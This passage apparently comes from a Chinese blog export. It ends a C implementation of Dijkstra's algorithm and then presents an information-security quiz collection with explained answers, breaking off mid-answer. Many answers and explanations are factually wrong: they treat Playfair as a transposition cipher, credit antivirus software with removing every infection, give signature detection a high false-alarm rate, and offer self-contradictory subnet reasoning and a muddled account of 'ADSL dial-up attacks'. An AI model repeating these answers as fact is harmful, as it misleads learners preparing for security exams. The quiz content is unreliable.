0; j &lt; num_vertices; j++) &#123;            if (!visited[j] &amp;&amp; dist[j] &lt; min_dist) &#123;                min_dist = dist[j];                u = j;            &#125;        &#125;        visited[u] = 1;        // 更新与u相邻的顶点的距离        for (int v = 0; v &lt; num_vertices; v++) &#123;            if (!visited[v] &amp;&amp; graph[u][v] != -1 &amp;&amp; dist[u] + graph[u][v] &lt; dist[v]) &#123;                dist[v] = dist[u] + graph[u][v];            &#125;        &#125;    &#125;    // 输出最短路径的长度    printf(&quot;从顶点 %d 到顶点 %d 的最短距离为 %d\\n&quot;, start, end, dist[end]);    // 确定最短路径上的顶点    int path[MAX_VERTICES];    int index = 0;    int current = end;    path[index++] = current;    while (current != start) &#123;        for (int i = 0; i &lt; num_vertices; i++) &#123;            if (graph[i][current] != -1 &amp;&amp; dist[i] + graph[i][current] == dist[current]) &#123;                current = i;                path[index++] = current;                break;            &#125;        &#125;    &#125;    // 输出最短路径上的顶点    printf(&quot;从顶点 %d 到顶点 %d 的最短路径为：: &quot;, start, end);    for (int i = index - 1; i &gt;= 0; i--) &#123;        printf(&quot;%d &quot;, path[i]);    &#125;    printf(&quot;\\n&quot;);&#125;int main() &#123;    // 读入图的信息    printf(&quot;输入[顶点数][边数]&quot;);    int num_vertices;    int num_edges;    scanf_s(&quot;%d%d&quot;, &amp;num_vertices, &amp;num_edges);       // 初始化图的邻接矩阵    for (int i = 0; i &lt; num_vertices; i++) &#123;        for (int j = 0; j &lt; num_vertices; j++) &#123;            graph[i][j] = -1;        &#125;    &#125;    // 读入边的信息    for (int i = 0; i &lt; num_edges; i++) &#123;        int source, dest, weight;        printf(&quot;输入数据，参数分别是：[起点][终点][两点间的距离]\\n&quot;);        scanf_s(&quot;%d%d%d&quot;, &amp;source, &amp;dest, &amp;weight);        printf(&quot;___________________________________ \\n&quot;);        printf(&quot;|                                  |\\n&quot;);        printf(&quot;|    %d    ----%d-----&gt;   %d          |\\n&quot;, source, weight, dest);        printf(&quot;|__________________________________| \\n&quot;);        graph[source][dest] = weight;    &#125;    dijkstra(0, num_vertices - 1, num_vertices);    return 0;&#125;\n\n","tags":["数据结构"]},{"title":"信息安全知识合集","url":"/2023/05/01/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E5%90%88%E9%9B%86/","content":"1窃听是一种被动（passive）攻击，攻击者无须（does not need to）将自己的系统插入到发送站和接收站之间。截获是一种主动（active）攻击，攻击者必须（must）将自己的系统插入到发送站和接收站之间。\n\n2关于计算机病毒，下列说法错误的是__。 \nA.计算机病毒是一个程序 \nB.计算机病毒的运行不消耗CPU资源\n C.计算机病毒具有传染性 \nD.病毒并不一定都具有破坏力\n  B选项说法错误。计算机病毒的运行会消耗CPU资源，因为它需要被操作系统加载到内存中并且执行。因此，B选项是错误的。\n\n3下列关于拒绝服务攻击说法错误的是\nA.带宽消耗是拒绝服务攻击的一种形式。B.拒绝服务攻击的目的之一是使合法用户无法正常访问资源。C.反射式拒绝服务攻击是攻击方直接向被攻击方发送封包。D.分布式拒绝服务攻击是同时利用大量的终端向目标主机发动攻击。\nC选项说法错误。反射式拒绝服务攻击不是攻击方直接向被攻击方发送封包，而是利用具有反射功能的第三方服务器将攻击流量反射回被攻击者，让被攻击者无法承受过多的流量从而瘫痪。因此，C选项是错误的。\n\n**目前使用的防杀病毒软件的作用是__**。\nA.检查计算机是否感染病毒，并消除已感染的任何病毒B.检查计算机是否感染病毒，并清除部分已感染的病毒C.杜绝病毒对计算机的侵害D.查出已感染的任何病毒，清除部分已感染的病毒\nA选项是正确答案。目前使用的防杀病毒软件的作用是检查计算机是否感染病毒，并消除已感染的任何病毒。因此，A选项是正确的。B、C和D选项描述的都不够准确。\n\n用户A通过计算机网络向用户B发消息，表示自己同意签订某个合同，随后用户A反悔，不承认自己发过该条消息。为了防止这种情况发生，应采用__。\nA.数字签名技术B.数据加密技术C.消息认证技术D.身份认证技术\nA选项是正确答案。为了防止用户在发送消息后否认其身份或内容，需要使用数字签名技术来实现消息的完整性和不可抵赖性。数字签名技术通过加密原始数据以及生成一个哈希值来保证消息的完整性，并使用发送方的私钥对哈希值进行加密，从而实现不可抵赖性。因此，A选项是正确的。B、C和D选项都没有提供防止否决的方法。\n\n下面不属于端口扫描技术的是__。\nA.TCPconnect()扫描B.IP包分段扫描C.TCPFIN扫描D.Land扫描\nB选项是不属于端口扫描技术的。IP包分段扫描没有涉及到具体的端口，而是利用TCP&#x2F;IP协议的一些特点来探测主机是否存活或者绕过某些防火墙&#x2F;IDS的检测。因此，B选项是正确的，它不是一种端口扫描技术。\n\n在下列这些网络攻击模型的攻击过程中，端口扫描攻击一般属于哪一类？\nA.信息收集B.攻击实施C.弱点挖掘D.痕迹清楚\n端口扫描攻击一般是信息收集（information gathering）阶段中的一种。在网络攻击中，攻击者首先需要了解目标系统的一些基本信息，其中之一就是探测目标主机开放的端口和运行的服务。通过使用各种端口扫描技术，攻击者可以获取有关目标系统的详细信息，并为后续攻击做准备。因此，答案是A.信息收集。\n\n负责产生、分配并管理PKI结构下所有用户的证书的机构是__。\nA.LDAP目录服务器B.注册机构RAC.业务受理点D.认证中心CA\nD.认证中心CA（Certificate Authority）负责产生、分配并管理PKI结构下所有用户的证书。RA（Registration Authority）是认证中心CA的一个辅助机构，它通常由客户机构自行设置来协助证书颁发机构管理客户端证书申请等流程。LDAP目录服务器是用于存储和访问目录信息的网络服务。业务受理点不属于PKI结构中的机构。因此，答案是D.认证中心CA。\n\n为了数据传输时不发生数据截获和信息泄密，采取了加密机制。这种做法体现了信息安全的__A__属性。\nA.保密性B.可靠性C.完整性D.可用性\n\nLinux中，什么命令可以控制口令的存活时间\nA.chageB.chmodC.passwdD.umask\nA.chage命令可以控制口令的存活时间。\nchage命令用于修改用户口令失效期限，可以通过指定“最后一次修改口令的日期”和“最长可使用的天数”来控制口令的存活时间。例如，可以使用以下命令强制用户在下次登录时更改其口令并设置口令有效期为30天：\nsudo chage -d 0 -M 30 username\n\n其中，-d选项将上次修改密码的日期设为0，表示让用户必须立即更新口令；-M选项将口令的最大生存期设为30天。\n\n下列关于ADSL拨号攻击的说法，正确的是__。\nA.能用ADSL设备打电话进行骚扰B.能用ADSL设备免费打电话C.能损坏ADSL物理设备D.能获取ADSL设备的系统管理密码\nADSL拨号攻击（ADSL dial-up attack）是一种利用ADSL猫（调制解调器）的漏洞，通过拨打特定号码的方式实现非法登录目标计算机的攻击方式。因此，A、B和C都不正确。\nADSL拨号攻击的具体过程是攻击者利用ADSL猫的Telnet默认账户（通常为root&#x2F;admin）和默认口令（通常为空）进行登录并获取管理权限，从而可以对ADSL猫进行任意操作，包括更改DNS服务器地址、篡改网页内容等。攻击者也可以修改ADSL猫的拨号配置，以便进行拨号攻击。因此，D选项是正确答案。\n\n关于特征代码法，下列说法错误的是__。\nA.采用特征代码法检测准确B.采用特征代码法误报警率高C.采用特征代码法可识别病毒的名称D.采用特征代码法能根据检测结果进行解毒处理\nD选项是错误的。特征代码法（signature-based detection）通常无法对新出现的、未知的病毒进行有效检测，而且误报率较高，容易将合法程序误认为是病毒。因此，它只能识别已知病毒的名称，并不能根据检测结果进行解毒处理。\n\n防火墙对进出网络的数据进行过滤，主要考虑的是__。\nA.内部网络的安全性B.Internet的安全性C.外部网络的安全性D.内部网络和外部网络的安全性\nD.内部网络和外部网络的安全性。防火墙既可以保护内部网络免受来自Internet的攻击，也可以控制内部网络对外部网络的访问。因此，防火墙主要考虑的是内部网络和外部网络的安全性。它可以过滤进出网络的数据流量、控制网络连接、验证用户身份等方式来实现网络的安全保护。防火墙还可以帮助企业实现网络访问控制、应用程序控制、数据传输加密、流量监测等功能，从而增强网络安全的能力。\n\n通过代理服务器使内部局域网中的客户机访问Internet时，不属于代理服务器的功能__。\nA.信息加密B.信息缓存C.信息转发D.共享IP地址\nA.信息加密不属于代理服务器的功能。代理服务器的主要作用是缓存常用网页、过滤HTTP请求、转发网络流量等，以提高网络访问速度和效率，并保护内部网络免遭Internet攻击。共享IP地址也是代理服务器的一个功能，它可以将多个客户机的网络流量汇集到同一个公共IP地址下，从而减少IP地址的消耗。然而，代理服务器并不会负责对信息进行加密处理，这通常需要使用VPN（Virtual Private Network）等专门的安全工具来实现。因此，A选项不属于代理服务器的功能。\n\nAH协议和ESP协议有__种工作模式。\nA.二B.四C.三D.五\nAH协议和ESP协议分别有两种工作模式，因此共计四种工作模式。\nAH协议（Authentication Header Protocol）是一种用于IP数据包身份验证和完整性保护的安全协议。它有两种工作模式：传输模式和隧道模式。\nESP协议（Encapsulating Security Payload Protocol）是用于在IP数据包中提供数据机密性、可靠性和身份认证的协议。它有两种工作模式：传输模式和隧道模式。\n因此，答案是B.四。\n\n目前，数据安全中使用的数据加密技术可以分为__。\nA.对称型加密和不对称型加密B.对称型加密、不对称型加密和不可逆加密C.对称型加密和不可逆加密D.对称型加密和可逆加密\nA.目前，数据安全中使用的数据加密技术主要分为对称型加密和不对称型加密两种。\n对称型加密（Symmetric Encryption）是一种将明文转换成密文的加密方式，在加密和解密过程中使用相同的密钥。由于加密和解密所用的密钥相同，因此对称型加密算法具有加密速度快、计算量小等优点。常见的对称型加密算法有DES、3DES、AES等。\n不对称型加密（Asymmetric Encryption）也称为公钥密码体制，采用公钥和私钥两个不同的密钥进行加密和解密。公钥可以随意发布，任何人都可以用它来加密信息，但只有持有相应私钥的人才能解密该信息。不对称型加密算法广泛应用于数字签名、密钥协商等领域。常见的不对称型加密算法有RSA、DSA等。\n因此，答案是A.对称型加密和不对称型加密。\n\n拒绝服务不包括以下哪一项\nA.DDoSB.Land攻击C.畸形报文攻击D.ARP攻击\nD. ARP攻击不属于拒绝服务攻击类型。ARP攻击是一种局域网攻击方式，通过伪造MAC地址等手段欺骗计算机网络中的其他设备，从而导致网络故障或信息泄露等问题。ARP攻击通常不会直接导致服务不可用，因此不属于拒绝服务攻击类型。\nA、B和C选项都是常见的拒绝服务攻击类型：\n\nDDoS（Distributed Denial of Service）分布式拒绝服务攻击：利用大量来自不同来源的电脑向目标服务器发送大量流量，使其无法正常处理合法请求。\nLand攻击：使用TCP&#x2F;IP协议栈漏洞，构造一些带有恶意数据的IP包，这些IP包具有相同的源IP地址和目标IP地址，从而导致目标系统崩溃或重启。\n畸形报文攻击（Fuzzing Attack）：利用特定的工具或脚本生成一些畸形报文，如过长、过大、格式错误等，以测试目标系统的稳定性和安全性。\n\n因此，答案是D.ARP攻击。\nA_是在蜜罐技术上逐步发展起来的一个新的概念，在其中可以部署一个或者多个蜜罐，来构成一个黑客诱捕网络体系架构。\n\nA.蜜网B.鸟巢C.鸟饵D.玻璃鱼缸\nA.蜜网（Honeynet）是在蜜罐技术上逐步发展起来的一个新概念，其中可以部署一个或多个蜜罐，来构成一个黑客诱捕网络体系架构。与单一蜜罐相比，蜜网具有更高的识别和响应能力，可以模拟现实网络环境，并收集大量的攻击数据，从而帮助安全专家更好地理解黑客攻击手段和行为规律，提高网络安全防范能力。\nB鸟巢、C鸟饵、D玻璃鱼缸都不是安全领域中的概念。\n\nWindow2000域或默认的身份验证协议是：__。\nA.HTMLB.TCP&#x2F;IPC.KerberosV5D.Apptalk\nC. Kerberos V5。Windows 2000域或默认的身份验证协议是Kerberos V5。\nKerberos是一种用于身份验证的安全协议，可防止网络中的监听和伪装攻击。它使用加密技术来验证用户身份，并为客户端和服务器之间的通信提供保护。Kerberos V5是一个开放标准，被广泛应用于许多操作系统和应用程序中，包括Windows、Unix、Linux等。\nHTML是一种用于创建网页的标记语言，TCP&#x2F;IP是互联网通信协议，Apptalk是苹果电脑上的一种局域网协议。这些协议都与身份验证无关。\n\n下列不属于数据传输安全技术的是__。\nA.防抵赖技术B.数据完整性技术C.数据传输加密技术D.旁路控制\nD.旁路控制不属于数据传输安全技术。旁路控制（Bypass Control）是一种网络管理技术，用于维护网络的高可用性和稳定性。它可以在网络故障或设备故障时，自动切换到备份通道或设备，以保证网络通信的持续性和稳定性。与防抵赖、数据完整性和数据传输加密等技术不同，旁路控制主要关注网络的可用性和稳定性，而不涉及数据的保密性和安全性。\n因此，答案是D.旁路控制。\n\n计算机感染特洛伊木马后的典型现象是：__。\nA.邮箱被垃圾邮件填满B.有未知程序试图建立网络连接C.Windows系统黑屏D.程序异常退出\nB.有未知程序试图建立网络连接。计算机感染特洛伊木马后，常见的典型现象是出现未知程序试图建立网络连接的提示或警告，这些程序通常会试图与互联网上的远程主机建立连接，以便收集用户信息、执行恶意指令等操作。此外，特洛伊木马还可能导致系统变慢、网络不稳定、应用程序异常退出等问题。\nA选项描述的是垃圾邮件攻击的现象，C选项描述的是Windows系统故障的现象，D选项描述的是应用程序故障的现象。这些现象都可能由其他原因引起，而不一定与特洛伊木马感染有关。因此，答案是B.有未知程序试图建立网络连接。\n\n不属于操作系统探测技术的是：__。\nA.攻击型漏洞探测技术B.ICMP响应分析探测技术C.获取标识信息探测技术D.操作系统指纹探测技术\nA.攻击型漏洞探测技术不是操作系统探测技术。攻击型漏洞探测技术通常是指利用已有安全漏洞来进行攻击的技术，而不是用于发现操作系统类型和版本的技术。\nB、C、D选项都属于操作系统探测技术：\n\nICMP响应分析探测技术：通过向目标主机发送ICMP数据包，并分析其响应报文的类型和内容，来推断出目标主机的操作系统类型和版本。\n获取标识信息探测技术：根据TCP&#x2F;IP协议中的标识字段、TTL值等特征信息，来判断目标主机的操作系统类型和版本。\n操作系统指纹探测技术：通过向目标主机发送一系列测试数据包，并基于对其响应报文的特征分析，来确定目标主机的操作系统类型和版本。\n\n因此，答案是A.攻击型漏洞探测技术。\n\n安全扫描可以__。\nA.弥补由于认证机制薄弱带来的问题B.弥补防火墙对内网安全威胁检测不足的问题C.弥补由于协议本身而产生的问题D.扫描检测所有的数据包攻击，分析所有的数据流\nC.安全扫描可以弥补由于协议本身而产生的问题。\n安全扫描是一种自动化工具，用于发现网络和主机上的安全漏洞和配置错误。它可以模拟攻击者的行为，向目标主机发送各种类型的数据包，并分析其响应报文，以确定可能存在的安全漏洞和风险。\n安全扫描的主要作用是帮助组织识别和修复网络和主机中的安全漏洞，弥补由于协议本身而产生的问题，以增强安全性。\nA选项描述的是认证机制薄弱导致的问题，B选项描述的是防火墙检测不足导致的问题，D选项描述的是对所有数据流进行分析的能力，这些都不属于安全扫描的主要作用。\n因此，答案是C.弥补由于协议本身而产生的问题。\n\n某银行为了加强自己的网站的安全性，决定采用一个协议，应该采用__协议。\nA.FTPB.SSLC.HTTPD.UDP\nB. SSL协议。 \nFTP协议是用于文件传输的协议，虽然可以进行加密，但安全性较差，在互联网上使用时容易受到攻击。\nUDP协议是无连接的传输协议，不提供可靠性和安全性保障。\nHTTP协议也是不安全的协议，信息在传输过程中容易被窃听、篡改或伪造。\nSSL（Secure Sockets Layer）协议是一种常用的加密协议，用于保护Web应用程序通信安全。SSL协议在客户端和服务器之间建立一个安全的通信管道，通过加密和认证机制来确保信息传输的安全性和完整性。\n因此，答案是B. SSL协议。\n\n下列不属于系统安全的技术是\nA.防火墙B.认证C.加密狗D.防病毒\nC.加密狗不属于系统安全的技术。\n加密狗是一种硬件式的加密设备，用于存储和管理加密密钥、数字证书等敏感信息，以提供更高的安全性和可信度。虽然加密狗可以在一定程度上保护数据的机密性和完整性，但它主要应用于数据加密和数字签名领域，与系统安全的其他技术如防火墙、认证、防病毒等无直接关系。\nA、B、D选项都属于系统安全的技术：\n\n防火墙：通过控制网络流量，实现对系统安全的保护，包括入侵检测、攻击防御、访问控制等功能。\n认证：用于验证用户身份和权限，以保障系统资源的安全性和隐私性。\n防病毒：用于检测和消除各种恶意软件，包括病毒、木马、蠕虫等，以保证系统的稳定性和安全性。\n\n因此，答案是C.加密狗。\n\n保证用户和进程完成自己的工作而又没有从事其他操作可能，这样能够使失误出错或蓄意袭击造成的危害降低，这通常被称为__。\nA.适度安全原则B.分权原则C.授权最小化原则D.木桶原则\nC.授权最小化原则。\n授权最小化原则（Principle of Least Privilege）是指只给予用户、进程或程序完成其工作所必需的最低权限，避免给予不必要的权限和访问权，从而减少系统被攻击者利用的风险。通过限制用户和进程的权限，可以降低失误出错和蓄意袭击造成的危害，确保系统安全性和稳定性。\nA选项描述的是适度安全原则，即在安全和便捷之间寻求一种平衡，不过此概念并不常见。\nB选项描述的是分权原则，即将系统的管理和控制权限分散到多个人员或实体中，以降低单个实体对系统造成的威胁。\nD选项描述的是木桶原则，即系统的安全强度和可靠性等级取决于最薄弱的环节或部分，就像一个木桶的容积取决于最短的那块木板一样。\n因此，答案是C.授权最小化原则。\n\n在以下各项功能中，不可能集成在防火墙上的是__。\nA.网络地址转换（NAT）B.入侵检测和入侵防御C.虚拟专用网（VPN）D.过滤内部网络中设备的MAC地址\nD.过滤内部网络中设备的MAC地址是不可能集成在防火墙上的。\n防火墙（Firewall）是一种网络安全设备，用于控制入站和出站流量，保护网络不被未经授权的访问和攻击所侵害。常见的防火墙包括软件防火墙和硬件防火墙，可以实现各种功能，例如：\nA. 网络地址转换（NAT）：将私有IP地址转换为公共IP地址，以实现网络连接和通信。B. 入侵检测和入侵防御：通过检测和分析威胁行为，及时报警或采取措施进行防御和修复。C. 虚拟专用网（VPN）：通过加密技术和隧道协议，打造一个安全、可靠的虚拟专用网络，实现远程访问和通信。\n而过滤内部网络中设备的MAC地址并不属于防火墙的主要功能范畴，这个过程需要在交换机等其他网络设备上完成。\n因此，答案是D.过滤内部网络中设备的MAC地址不能集成在防火墙上。\n\n当程序顺序执行时，每取一条指令语句，IP指针增加的值是__。\nA.1B.3C.2D.由指令长度决定\nD. 由指令长度决定。\n在程序顺序执行时，CPU会根据PC（程序计数器）中指令的地址，从内存中读取一条指令并进行解析和执行。每条指令的长度是不一样的，有的指令只有一个字节，有的指令则可能有多个字节。因此，当CPU执行完一条指令后，需要根据当前指令的长度来更新PC的值，以便能够正确地执行下一条指令。具体来说：\n\n对于固定长度的指令集，每次指针增加由指令长度决定；\n对于变长指令集，通常会在指令中包含长度信息，CPU根据指令中的长度信息来更新PC的值。\n\n因此，答案是D.由指令长度决定。\n\n一个路由器有两个端口，分别接到两个网络，两个网络各有一个主机，IP地址分别为110.25.53.1和110.24.53.6，子网掩码均为255.255.0.0，请从中选出两个IP地址分别分配给路由器的两个端口__。A.110.25.52.2和110.24.52.7B.111.25.53.2和111.24.53.7C.110.24.53.2和110.25.53.7D.110.25.53.2和110.24.53.7\nC. 110.24.53.2 和 110.25.53.7 是应该分配给路由器的两个端口的IP地址。\n根据题目中的信息，两个主机所在的网络的IP地址是 110.25.53.1 和 110.24.53.6，子网掩码均为 255.255.0.0。因此，这两个主机位于同一子网中，可以直接通信。\n路由器有两个端口，需要分别接到这两个网络上，并且要和两个主机进行通信。为了实现这个目的，需要在路由器的两个端口上分别配置一个IP地址，使得它们分别属于相应的网络，以便路由器能够在不同的网络之间进行转发和路由选择。\n根据要求，路由器的第一个端口应该分配一个与 110.24.53.6 在同一网络段（即 110.24.x.x）的IP地址，同时能与另一个网络（即 110.25.x.x）相连。因此，可以将该端口的IP地址设置为 110.24.53.2。\n同理，路由器的第二个端口应该分配一个与 110.25.53.1 在同一网络段（即 110.25.x.x）的IP地址，同时能与另一个网络（即 110.24.x.x）相连。因此，可以将该端口的IP地址设置为 110.25.53.7。\n因此，答案是 C. 110.24.53.2 和 110.25.53.7。\n\nTelnet指的是\nA.万维网B.文件传输C.电子邮件D.远程登录\nD. 远程登录。\nTelnet是一种远程登录协议，用户可以通过Telnet协议在本地计算机上输入命令，控制远程计算机的操作和管理。Telnet协议使用TCP作为传输协议，其通信过程采用明文形式进行，因此安全性较差，很容易受到网络攻击。现在，SSH（Secure Shell）已经逐渐替代了Telnet，成为更加安全的远程登录协议。\nA. 万维网（World Wide Web）是一种基于互联网的信息服务模式，主要通过超文本链接来组织和展示信息资源。\nB. 文件传输（File Transfer Protocol，FTP）是一种用于在不同计算机之间传输文件的标准协议。\nC. 电子邮件（Electronic Mail，Email）是一种通过电子方式传送消息的通讯方式，常用于个人或企业之间的通讯。\n因此，答案是 D. 远程登录。\n\n下列哪一种扫描技术属于半开发（半连接）扫描？\nA.TCP Connect扫描B.TCP FIN扫描C.TCP SYN扫描D.TCP ACK扫描\nC. TCP SYN扫描属于半开放（半连接）扫描。\nTCP SYN扫描是一种常见的端口扫描技术，也是最为常用的一种扫描方式之一。它通过向目标计算机发送一个SYN包来检测目标主机上是否存在开放的端口。当目标主机接收到这个包时，如果返回一个SYN&#x2F;ACK包，则表示该端口处于打开状态，可以建立连接。而如果目标计算机返回一个RST包，则表示该端口处于关闭状态。\n与TCP Connect扫描不同的是，TCP SYN扫描采用了半开放（半连接）的方式进行扫描，即在三次握手中只发送SYN包而不是完全建立连接。这样可以减少建立连接所需的时间和资源，降低扫描被探测到的风险，同时也可以在一定程度上规避防火墙和入侵检测系统的检测。\nTCP FIN扫描和TCP ACK扫描也是常见的端口扫描技术，但它们不属于半开放（半连接）扫描。\n因此，答案是 C. TCP SYN扫描。\n\n能正确描述TCP&#x2F;IP协议的数据封装过程的是__。\nA.数据段–&gt;数据包–&gt;数据帧–&gt;数据流–&gt;数据B.数据–&gt;数据包–&gt;数据段–&gt;数据帧–&gt;数据流C.数据流–&gt;数据段–&gt;数据包–&gt;数据帧–&gt;数据D.数据–&gt;数据段–&gt;数据包–&gt;数据帧–&gt;数据流\nD. 数据 → 数据段 → 数据包 → 数据帧 → 数据流。\nTCP&#x2F;IP协议是互联网的基础协议之一，它将数据分成不同的层次进行传输和处理，每一层向上提供服务并向下面层提供接口。在数据封装过程中，TCP&#x2F;IP协议采用了分层的设计，将数据分为多个不同的层次，并在不同的层次上进行封装和解封装。常见的TCP&#x2F;IP协议的数据封装过程是：\n数据 → 数据段(Segments) → 数据包(Packets) → 数据帧(Frames) → 数据流(Streams)\n具体来说，数据通过应用层生成应用层协议数据单元(Application Layer Protocol Data Unit，APDU)，然后被TCP或UDP协议封装成数据段(Segments)。接着，在网络层，IP协议将数据段封装成数据包(Packets)，并添加源地址和目标地址等信息。在数据链路层，数据包被封装成数据帧(Frames)，并添加帧起始符、帧结束符、校验码等信息。最后，数据帧被转换成数字信号，并通过物理层实际传输。\n因此，答案是 D. 数据 → 数据段 → 数据包 → 数据帧 → 数据流。\n\n包过滤的局限性不包括__。\nA.不能进行内容控制B.访问控制机制C.过滤规则制定比较复杂D.不支持实现NAT\nB. 访问控制机制不属于包过滤的局限性。\n包过滤是一种常见的网络安全技术，其主要原理是根据预设规则对数据包进行过滤和拦截，以保护网络系统的安全。然而，包过滤技术也存在一些局限性，其中包括：\nA. 不能进行内容控制：传统的包过滤技术只能根据网络协议、IP地址、端口等信息对数据包进行过滤，无法对数据包的具体内容进行过滤和检测。\nC. 过滤规则制定比较复杂：包过滤需要针对不同的应用场景和网络环境进行相应的规则制定，这需要依赖专业知识和经验，并且可能受到不同厂商产品之间的差异性影响。\nD. 不支持实现NAT：包过滤技术虽然可以对不同网络之间的数据进行过滤和拦截，但不能对内网中的私有IP地址进行转换和映射，因此无法实现网络地址转换（NAT）功能。\nB. 访问控制机制并不属于包过滤的局限性，它通常被作为包过滤技术的一个重要补充，可以实现基于身份、角色和权限的细粒度访问控制。\n因此，答案是 B. 访问控制机制不属于包过滤的局限性。\n\n下列标准中不属于PKI系统本身的是__。\nA.X.509B.X.209C.X.500D.X.409\nD. X.409 不属于PKI系统本身。\n公钥基础设施(PKI)是一种基于公钥加密算法和数字证书技术的安全体系结构，用于保障信息在互联网上的传输和使用安全。PKI系统主要由以下几个部分组成：\nA. X.509：一种数字证书格式标准，定义了数字证书中包含的信息格式、编码方式等细节规范。\nB. X.209：一种数据编码规范，通常用于将数字证书中的各种数据进行编码和解码，使其能够被网络传输。\nC. X.500：一个目录服务协议，定义了在网络环境下对用户和资源信息进行检索和管理的标准协议。\nD. X.409 并不属于PKI系统本身，它可能是一些其他的编码或协议标准。\n因此，答案是 D. X.409 不属于PKI系统本身。\n\n使用NewZoneWizard(新区域向导)创建了一个新的区域。如果你要创建一个已有区域的复制器，那么你将选定下列哪一种区域类型?__。\nA.AciveDirectory集成区域。B.标准从区域。C.标准主区域。D.ActiveDirectory次级区域。\nB. 标准从区域。\n在Windows Server中，可以使用DNS管理器创建和管理DNS区域。当需要创建一个已有区域的复制器时，应选择“标准从区域（Secondary Zone）”。\n标准从区域是一种DNS区域类型，它包含了主区域的副本。当主区域中的资源记录发生变化时，标准从区域会通过DNS传输协议 (DNS transfer protocol) 从主区域获取最新的资源记录副本。由于标准从区域只是主区域的一个副本，因此不能直接修改其包含的资源记录。如果需要修改标准从区域中的资源记录，必须先修改主区域中的资源记录并等待数据传输完成后，才能在标准从区域中看到更新后的内容。\nActive Directory集成区域、标准主区域和Active Directory次级区域都是不同类型的DNS区域。它们与标准从区域在功能和用途上存在一定的差异，不适用于创建已有区域的复制器。\n因此，答案是 B. 标准从区域。\n\nHTTPS是一种安全的HTTP协议，它使用__。\nA.SSL&#x2F;TLSB.SSHC.SETD.IPSec\nA. SSL&#x2F;TLS。\nHTTPS是一种基于HTTP协议，并通过SSL&#x2F;TLS协议进行加密和身份验证的安全通信协议。在HTTPS通信中，浏览器和Web服务器通过SSL&#x2F;TLS协议建立安全的通道，使用公钥和私钥进行加密和解密操作，以保证通信过程的安全性和可靠性。\nSSL（Secure Sockets Layer）和TLS（Transport Layer Security）协议都是一种加密通信协议，用于在计算机网络中实现数据传输的安全与保密性。SSL协议由Netscape开发，而TLS协议是在SSL协议的基础上发展而来，并被广泛应用于互联网、移动通信等领域。\nSSH（Secure Shell）是一种用于远程登录的加密协议，主要用于保证远程登录过程的安全性和可靠性，同时还可以传输其他加密数据。SSH协议常用于Linux或Unix系统的远程管理和文件传输等场景。\nSET（Secure Electronic Transaction）是一种用于安全电子商务的协议，其目的是为了提供更高级别的数据加密和数字签名技术，以保护在线交易过程中的信息安全。\nIPSec（Internet Protocol Security）是一种用于IP网络的安全协议，它可以提供端到端的安全通信机制，包括加密、认证和数据完整性检查等功能。\n因此，答案是 A. SSL&#x2F;TLS。\n\n在以下古典密码体制中，属于置换密码的是__。\nA.移位密码B.仿射密码C.倒序密码D.PlayFair密码\nD. Playfair密码是置换密码。\n在古典密码学中，有两类主要的加密算法：置换密码和替换密码。其中，置换密码通过改变明文中字符的位置来加密数据，而替换密码则通过对明文中的字符进行替换来实现加密。\n移位密码、仿射密码和倒序密码都属于替换密码，它们通过替换明文中的字母来加密数据。具体来说：\n\n移位密码是一种最简单的替换密码，它将明文中的每个字母向后移动固定的“偏移量”个位置，并用新的字母替换原来的字母以完成加密。\n\n仿射密码是一种基于线性代数的密码学算法，它通过将明文中的每个字母映射到另一个字母来加密数据。具体来说，仿射密码使用公式E(x)&#x3D;(ax+b) mod m计算每个字母的加密结果，其中a和b是密钥参数，m是字母表大小。\n\n倒序密码是一种简单的替换密码，它将明文中的每个字母按照相反的顺序进行排列，并用新的字母替换原来的字母以完成加密。\n\n\nPlayfair密码是一种常见的古典密码，它属于置换密码。Playfair密码使用一个5x5的矩阵（称为密钥矩阵）来映射明文中的每一对字母。具体来说，密钥矩阵中包含了所有可能的字母和一个填充字符，当明文中有相邻的字母时，会将这两个字母映射到密钥矩阵中的不同位置上，并用新的字母对替换原来的字母。\n因此，答案是 D. Playfair密码。\n\n在基于Linux平台的应用系统开发中，不能够采用的中间件技术是__。\nA.EJBB.CORBAC.DCOMD.WebServices\nC. DCOM。\nDCOM（Distributed Component Object Model）是一种微软公司开发的分布式对象技术，主要用于在同一局域网内不同计算机之间进行通信和数据传输。它使用了RPC（Remote Procedure Call，远程过程调用）协议来实现远程访问，并支持COM（Component Object Model）技术，可以通过COM接口来共享对象。DCOM是基于Windows平台的中间件技术，不适用于Linux平台的应用系统开发。\nEJB（Enterprise JavaBean）是一种Java企业级组件技术，用于构建Java EE应用程序。它提供了一种面向服务器端的组件模型，包括会话Bean、实体Bean和消息驱动Bean等类型。EJB组件可以部署到Java应用服务器上，并且支持分布式事务处理和远程访问等功能，是Java EE应用程序中非常重要的一部分。\nCORBA（Common Object Request Broker Architecture）是一种面向对象的分布式计算架构，可以实现异构系统之间的通信和互操作性。CORBA定义了一套标准化的接口规范和通信协议，支持多种编程语言和操作系统平台。\nWeb Services是一种基于XML、SOAP、WSDL等标准技术的分布式计算模型，可以将应用程序发布为可被其他应用程序访问的Web服务。Web Services支持标准化的接口定义和数据格式，可以实现异构系统之间的互操作性和通信。\n因此，答案是 C. DCOM。\n\n下面不属于容灾内容的是__。\nA.灾难预测B.风险分析C.灾难演习D.业务影响分析\n下面不属于容灾内容的是灾难预测。容灾（Disaster Recovery）主要是指在灾难发生后，如何将业务系统恢复到正常状态，确保业务连续性和可用性。与之相对应的是灾难预防（Disaster Prevention），它主要是在灾难发生前，采取各种措施预防灾难的发生，减少灾难对业务的影响。\n\nDES算法的分组长度为__位。\nA.64B.32C.128D.96\na\n\n在Windows2000Professional安装过程中，你正在尝试加入到一个域，而得到的错误是Setup无法找到域控制器。以下哪个是你不需要检查的?__。\nA.检查你是否输入了正确的域名称B.检测是否有正在运行的WINS服务器C.检测是否有可用的域控制器D.检测是否有正在运行的DNS服务器\n如果在Windows 2000 Professional安装过程中，你正在尝试加入到一个域，而得到的错误是Setup无法找到域控制器，则你不需要检查是否有正在运行的WINS服务器。这是因为WINS服务器主要用于处理NetBIOS名称解析，而Windows 